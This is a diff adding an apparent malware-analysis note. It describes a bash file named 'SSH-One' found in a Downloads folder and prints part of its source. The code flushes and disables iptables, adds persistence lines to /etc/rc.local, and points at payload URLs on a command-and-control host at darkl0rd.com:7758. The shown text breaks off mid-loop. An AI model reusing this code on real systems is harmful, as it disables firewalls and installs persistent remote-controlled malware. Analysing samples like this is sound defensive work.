@@ -1,0 +1,28 @@
+Analyzing the following directory for suspicious files, it was found that the 'SSH-One' is an executable bash file that maliciously scans for SSH ports on the infected system and attempts to utilize TTY using the SSH-T and SSH-One switches to open an interactive session with the Command and Control server at http://darkl0rd.com on port 7758 for both the SSH-T and -One switches.
+
+root@ubuntu-VirtualBox:/home/ubuntu/Downloads# ls
+ft32  ft64  gates.lod  moni.lod  notes.txt  SSH-One  tmplog  wipefs
+
+#!/bin/bash
+iptables -F
+/etc/init.d/iptables stop
+chkconfig iptables off
+echo "chmod +x /tmp/SSH-T" >> /etc/rc.local
+echo "/tmp/SSH-T" >>  /etc/rc.local
+echo "chmod +x /tmp/SSH-One" >> /etc/rc.local
+echo "/tmp/SSH-One" >>  /etc/rc.local
+m=SSH-T
+script=SSH-One
+hfs_m=http://darkl0rd.com:7758/SSH-T
+hfs_s=http://darkl0rd.com:7758/SSH-One
+rm -f /tmp/$m*
+while true
+
+do
+    ps aux | grep $m | grep -v grep
+    if [ $? -eq 0 ];then
+         sleep 10
+    else
+                ls -l /tmp/$m
+                        if [ $? -eq 0 ];then
+                         /tmp/$m
